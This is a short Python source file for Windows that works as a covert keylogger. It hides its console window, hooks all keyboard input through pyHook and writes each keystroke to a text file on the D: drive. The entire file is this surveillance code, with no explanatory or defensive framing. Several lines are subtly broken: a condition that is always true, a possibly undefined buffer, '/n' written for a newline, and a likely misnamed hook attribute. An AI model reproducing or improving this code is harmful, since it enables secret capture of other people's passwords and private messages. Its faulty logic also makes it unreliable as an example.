# -*- coding: utf-8 -*-

import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        exit(1)

    if event.Ascii !=0 or 8:
        f = open("D:\output.txt", 'r')
        buffer = f.read()
        f.close()

    f = open('D:\output.txt', 'w')
    keylogs = chr(event.Ascii)

    if event.Ascii == 13:
        keylogs = '/n'

    buffer += keylogs
    f.write(buffer)
    f.close()

if __name__ == '__main__':
    hm = pyHook.HookManager()
    hm.keyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
